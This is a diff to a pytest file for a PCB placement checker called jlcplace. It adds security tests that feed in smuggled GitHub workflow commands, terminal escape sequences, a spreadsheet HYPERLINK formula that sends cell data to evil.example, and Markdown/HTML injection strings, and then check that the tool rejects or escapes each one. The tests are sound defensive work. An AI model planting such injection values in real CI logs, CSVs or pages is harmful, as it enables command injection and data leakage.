@@ -1,10 +1,13 @@
 """The command line, the pipeline and the reports on a synthetic board with hand-made EasyEDA records: no KiCad, no
 EasyEDA data and no network needed."""
 import csv
+import io
 from html.parser import HTMLParser
 import json
 import os
 import random
+import re
+import shutil
 import xml.etree.ElementTree as ET
 from pathlib import Path
 from types import SimpleNamespace
@@ -12,7 +15,7 @@ from types import SimpleNamespace
 import pytest
 
 from jlcplace import convention as cv
-from jlcplace import geom
+from jlcplace import geom, report
 from jlcplace.board import save_snapshot
 from jlcplace.check import check_row
 from jlcplace.cli import main
@@ -21,7 +24,7 @@ from jlcplace.db import CorrectionDB
 from jlcplace.model import BOTTOM, GREEN, RED, TOP, VERIFIED, YELLOW, Board, Correction, CplRow, EEFootprint, \
     NotFound, Pad, Part
 from jlcplace.parts import ee_key
-from jlcplace.pipeline import Run, apply_bom_codes, check, correction, key_reasons, proxy_footprint, resolve
+from jlcplace.pipeline import CheckItem, Run, apply_bom_codes, check, correction, key_reasons, proxy_footprint, resolve
 from jlcplace.report import _gh, github_annotations, html, junit
 
 ORIGIN = (100.0, 100.0)
@@ -334,12 +337,12 @@ class _Tags(HTMLParser):
 
     def __init__(self):
         super().__init__()
-        self.stack, self.bad, self.external = [], [], []
+        self.stack, self.bad, self.external, self.links = [], [], [], []
 
     def handle_starttag(self, tag, attrs):
         for k, v in attrs:
             if k in ("src", "href") and v and not v.startswith("#"):
-                self.external.append(v)
+                (self.links if tag == "a" and k == "href" else self.external).append(v)
         if tag not in self.VOID:
             self.stack.append(tag)
 
@@ -959,3 +962,213 @@ def test_a_reference_on_the_board_twice_is_red(env, capsys):
 class _Client:
     def get(self, code):
         return NotFound(code, "not here")
+
+
+# ------------------------------------------------------------------------------------------------------- security
+
+INJECT = "\n::error file=README.md,line=1::injected\n::stop-commands::tok123\x1b[8m"
+
+
+def own_lines_only(text: str) -> None:
+    """No line a GitHub runner would take for a workflow command but jlcplace's own annotations, and no terminal
+    escapes."""
+    for ln in text.splitlines():
+        if ln.startswith("::"):
+            assert ln.startswith(("::error file=", "::warning file=", "::error title=jlcplace", "::warning title=")) \
+                and "title=jlcplace" in ln, ln
+    assert "\x1b" not in text and "\x01" not in text, repr(text)
+
+
+def test_control_characters_in_a_reference_are_bad_input(env, capsys):
+    """sec-1 / sec-3: a reference holding a newline and '::' (KiCad strings take \\n and \\x escapes, a CSV field
+    takes a quoted newline) put workflow commands at column 0 of the summary, and \\x01 made the JUnit file
+    unreadable. No designator holds a control character: the board, CPL or BOM is bad input, named readably."""
+    board = env.make()
+    run(capsys, "cpl", env.board, "-o", env.out, *offline(env))
+    rows = env.out
+    board.part("R2").ref = "R2" + INJECT
+    save_snapshot(board, env.tmp / "evil.json")
+    code, out, err = run(capsys, "check", env.tmp / "evil.json", rows, *offline(env), "--github-annotations",
+                         "--junit", env.tmp / "r.xml")
+    assert code == 3 and "R2\\n::error" in err and "control character" in err, err
+    own_lines_only(out + err)
+    assert not (env.tmp / "r.xml").exists()
+    pcb = env.tmp / "evil.kicad_pcb"
+    pcb.write_text('(kicad_pcb (version 20241229) (setup (aux_axis_origin 100 100))\n'
+                   '  (footprint "R:R" (layer "F.Cu") (at 110 95 90) (property "Reference" "R1\\n::error::x\\x01")\n'
+                   '    (pad "1" smd rect (at -0.48 0) (size 0.56 0.62) (layers "F.Cu"))))\n')
+    code, out, err = run(capsys, "check", pcb, rows, "--reader", "sexpr", *offline(env))
+    assert code == 3 and "R1\\n::error::x\\x01" in err, err
+    own_lines_only(out + err)
+    text = (env.tmp / "board.csv")
+    text.write_text('Designator,Mid X,Mid Y,Layer,Rotation\r\n"R1' + INJECT + '",10,5,Top,0\r\n')
+    code, out, err = run(capsys, "check", env.board, text, *offline(env), "--github-annotations")
+    assert code == 3 and "line 2" in err and "control character" in err, err
+    own_lines_only(out + err)
+    bom = env.tmp / "bom.csv"
+    bom.write_text("Comment,Designator,Footprint,LCSC\n10k,\"R1,R2\x1b[8m\",0402,C1002\n")
+    code, out, err = run(capsys, "check", env.board, rows, "--bom", bom, *offline(env))
+    assert code == 3 and "R2\\x1b[8m" in err, err
+    own_lines_only(out + err)
+
+
+def test_text_from_easyeda_and_the_database_is_printed_without_control_characters(env, capsys):
+    """sec-1: a server's (or a cached) not-found message, an EasyEDA title and a committed database file are not
+    jlcplace's to put on a terminal or a CI log as they are: control characters are shown as \\xNN."""
+    env.make(two("R3", TOP, 112.0, 70.0, 0.0, "C1005"))
+    cache = env.tmp / "evilcache"
+    shutil.copytree(env.cache, cache)
+    (cache / "C1005.json").write_text(json.dumps({"success": False, "code": 404,
+                                                  "message": "Component not found" + INJECT}))
+    rec = json.loads((cache / "C1002.json").read_text())
+    rec["result"]["packageDetail"]["title"] = "R0402" + INJECT
+    (cache / "C1002.json").write_text(json.dumps(rec))
+    run(capsys, "cpl", env.board, "-o", env.out, *offline(env, str(cache)), "--force")
+    code, out, err = run(capsys, "check", env.board, env.out, *offline(env, str(cache)), "--github-annotations",
+                         "--fail-on", "yellow")
+    assert code == 1 and "Component not found\\x0a::error" in out, out
+    own_lines_only(out + err)
+    for cmd in (["fetch", "C1005", "C1002"], ["show", "C1005"], ["show", "C1002"], ["fit", env.board],
+                ["show", env.board, "--ref", "R3"]):
+        code, out, err = run(capsys, *cmd, "--cache", str(cache), *(["--offline"] if cmd[0] != "fetch" else []))
+        assert code in (0, 2) and "\\x0a::" in out, (cmd, out)
+        own_lines_only(out + err)
+    db = env.tmp / "db"
+    db.mkdir()
+    (db / "C1005.json").write_text(json.dumps({"lcsc": "C1005", "entries": [{
+        "ee": {"key": "", "title": "x" + INJECT}, "kicad": {"fpid": "R" + INJECT, "pad_hash": ""},
+        "correction": {"rot": 0, "dx": 0, "dy": 0, "mirror": False}, "verdict": "yellow", "status": "manual",
+        "reasons": ["typed in" + INJECT], "verifications": []}]}))
+    code, out, err = run(capsys, "show", "C1005", "--db", db, *offline(env, str(cache)))
+    assert code == 0 and "typed in" in out, out
+    own_lines_only(out + err)
+    code, out, err = run(capsys, "check", env.board, env.out, "--db", db, *offline(env, env.empty))
+    assert "typed in\\x0a::" in out, out
+    own_lines_only(out + err)
+
+
+def test_junit_is_well_formed_whatever_the_text():
+    """sec-3: ElementTree writes characters XML 1.0 forbids (\\x01, \\x1b) as they are, and every JUnit reader
+    refuses the file."""
+    part = two("R1", TOP, 110.0, 95.0, 0.0, "C1002")
+    res = check_row(part, CplRow("R1", 10.5, 5.0, TOP, 0.0), None, ORIGIN)
+    res.messages.append("odd \x01 text \x1b[8m ￾ end")
+    res.ref = "R1\x0b"
+    run_ = Run(Board("b\x02.kicad_pcb", ORIGIN, [part]), [res.row], [res], {}, cpl_path="x\x03.csv",
+               bom_messages=["BOM \x04 issue"])
+    for fail_on in (RED, YELLOW):
+        root = ET.fromstring(junit(run_, fail_on=fail_on))
+        text = ET.tostring(root, encoding="unicode")
+        assert "odd � text �[8m � end" in text and 'name="R1�"' in text, text
+    own_lines_only("\n".join(github_annotations(run_)) + report.summary(run_))
+
+
+def test_checklists_and_the_cpl_carry_no_formulas_or_markup(env, capsys):
+    """sec-4: a reference like =HYPERLINK(...) went verbatim into the CPL `cpl` writes and into checklist.csv, where
+    a spreadsheet runs it, and the Markdown checklist put references and messages in raw, so links and images
+    rendered in a job summary or a PR comment. Such a reference is bad input (no designator starts with = + - @);
+    a checklist cell that starts like a formula is quoted, and Markdown is escaped."""
+    board = env.make()
+    board.part("R2").ref = '=HYPERLINK("http://evil.example/?"&A1,"click")'
+    save_snapshot(board, env.tmp / "formula.json")
+    code, _, err = run(capsys, "cpl", env.tmp / "formula.json", "-o", env.out, *offline(env), "--force")
+    assert code == 3 and "not a designator" in err and not os.path.exists(env.out), err
+    part = two("R1", TOP, 110.0, 95.0, 0.0, "C1002")
+    res = check_row(part, CplRow("R1", 10.5, 5.0, TOP, 0.0), None, ORIGIN)
+    run_ = Run(Board("b.kicad_pcb", ORIGIN, [part]), [res.row], [res], {}, cpl_path="x.csv")
+    run_.checklist = lambda: [
+        CheckItem("not simulated", "=1+1", "C1002", TOP, None, "@SUM(1)", RED),
+        CheckItem("not simulated", "R1](http://evil.example/)![x", "C1002", TOP, 0.0,
+                  "<img src=http://evil.example/p.png> [click](http://evil.example/) `code` *bold* _it_ \\", YELLOW)]
+    rows = list(csv.reader(io.StringIO(report.checklist_csv(run_))))
+    assert rows[1][1] == "'=1+1" and rows[1][6] == "'@SUM(1)" and rows[2][1] == "R1](http://evil.example/)![x"
+    md = report.checklist_markdown(run_)
+    item = md.split("- [ ] ", 2)[2]
+    assert re.search(r"(?<!\\)[\[\]<>`*_]", item.replace("**", "", 2).replace("**(", "(")) is None, item
+    assert "R1\\](http://evil.example/)!\\[x" in item and "\\<img src=http://evil.example/p.png\\>" in item, item
+    assert "**=1+1** (C1002, top) **(red: fix the row first)**: @SUM(1)" in md, md
+
+
+class _Net:
+    """urlopen for the EasyEDA API answering from RECORDS; records the codes asked for."""
+
+    def __init__(self):
+        self.codes = []
+
+    def __call__(self, req, timeout=None):
+        code = req.full_url.split("/products/")[1].split("/")[0]
+        self.codes.append(code)
+        body = json.dumps(RECORDS.get(code, {"success": False, "code": 404, "message": "Component not found"}))
+        return SimpleNamespace(status=200, read=lambda: body.encode(), close=lambda: None)
+
+
+def test_records_are_downloaded_only_when_asked(env, capsys, monkeypatch):
+    """net-1: check, cpl, fit, show and confirm called easyeda.com for every code the cache lacked unless --offline
+    was given, so a CI job that forgot it sent EasyEDA traffic on every run. Now only `fetch` and --online use the
+    network, and a check that lacks records says how to get them."""
+    import time
+    import urllib.request
+    env.make()
+    net = _Net()
+    monkeypatch.setattr(urllib.request, "urlopen", net)
+    monkeypatch.setattr(time, "sleep", lambda s: None)
+    run(capsys, "cpl", env.board, "-o", env.out, *offline(env))
+    cache = env.tmp / "fresh"
+    for cmd in (["check", env.board, env.out], ["cpl", env.board, "-o", env.tmp / "o.csv"], ["fit", env.board],
+                ["show", "C1001"], ["show", env.board, "--ref", "U1"],
+                ["confirm", env.board, "--ref", "U1", "--db", env.tmp / "db", "--by", "me", "--source", "manual"]):
+        code, out, err = run(capsys, *cmd, "--cache", cache)
+        assert code != 4 and net.codes == [], (cmd, out, err)
+    code, out, err = run(capsys, "check", env.board, env.out, "--cache", cache)
+    assert code == 2 and "no EasyEDA record in the cache" in out, out
+    note = next(ln for ln in out.splitlines() if ln.startswith("jlcplace: "))
+    assert "2 codes (C1001, C1002)" in note and "jlcplace fetch" in note and "--online" in note, note
+    assert run(capsys, "check", env.board, env.out, "--cache", cache, "--online", "--offline")[0] == 3
+    code, out, err = run(capsys, "check", env.board, env.out, "--cache", cache, "--online")
+    assert code == 0 and sorted(net.codes) == ["C1001", "C1002"] and "4 green" in out, out
+    assert sorted(p.name for p in cache.iterdir()) == ["C1001.json", "C1002.json"]
+    code, out, err = run(capsys, "check", env.board, env.out, "--cache", cache)
+    assert code == 0 and len(net.codes) == 2 and "jlcplace fetch" not in out, out
+    code, out, err = run(capsys, "fetch", "C1003", "--cache", cache)
+    assert code == 0 and net.codes[2:] == ["C1003"], out
+
+
+def test_html_report_declares_the_source_of_the_easyeda_outlines_where_they_are_drawn(env):
+    """lic-1: the records' licence asks that a reproduction prominently declare its source as the "JLCEDA/EasyEDA
+    Official Library", with links to https://lceda.cn/ and https://easyeda.com, and not hide it. The report drew
+    every EasyEDA pad outline with only a muted footer paraphrase whose links could not be followed."""
+    board = env.make()
+    from jlcplace.easyeda import from_response
+
+    class Client:
+        def get(self, code):
+            return from_response(code, RECORDS[code])
+
+    resolved = resolve(board, Client(), use_fallback=True)
+    rows = [CplRow(r, *cv.cpl_row_for(board.part(r), resolved[r].corr, ORIGIN)[:2], board.part(r).layer,
+                   cv.cpl_row_for(board.part(r), resolved[r].corr, ORIGIN)[2]) for r in ("U1", "U2", "R1", "R2")]
+    page = html(check(board, rows, resolved))
+    p = _Tags()
+    p.feed(page)
+    assert p.external == [] and p.bad == [] and p.stack == []
+    assert set(p.links) == {"https://lceda.cn/", "https://easyeda.com"}
+    first_board, first_card = page.index('<path class="ee '), page.index('<details class="card')
+    for at in (first_board, first_card):            # declared above the board views and again above the cards
+        before = page[:at][-3000:]
+        assert "JLCEDA/EasyEDA Official Library" in before, at
+        assert 'href="https://lceda.cn/"' in before and 'href="https://easyeda.com"' in before, at
+    banner = page[page.index('class="source"'):first_board]
+    assert "note" not in banner.split(">")[0] and "copyright and related rights" in banner
+    assert page.rindex("JLCEDA/EasyEDA Official Library") > page.index("<footer")      # and in the footer still
+
+
+def test_readme_ci_recipe_writes_no_html_report_and_downloads_nothing():
+    """lic-1 / net-1: the README's workflow wrote --report cpl.html (EasyEDA pad outlines) on the runner, a step away
+    from an artifact of a public repository; and the commands' network use is opt-in."""
+    text = (Path(__file__).resolve().parents[1] / "README.md").read_text()
+    recipe = text[text.index("# .github/workflows/cpl.yml"):]
+    recipe = recipe[:recipe.index("```")]
+    commands = "\n".join(ln for ln in recipe.splitlines() if not ln.strip().startswith("#"))
+    assert "jlcplace check" in commands and "--report" not in commands and "--online" not in commands, recipe
+    assert "upload" in recipe.lower() and "artifact" in recipe.lower(), recipe
+    assert "--online" in text and "max_total_wait" not in text
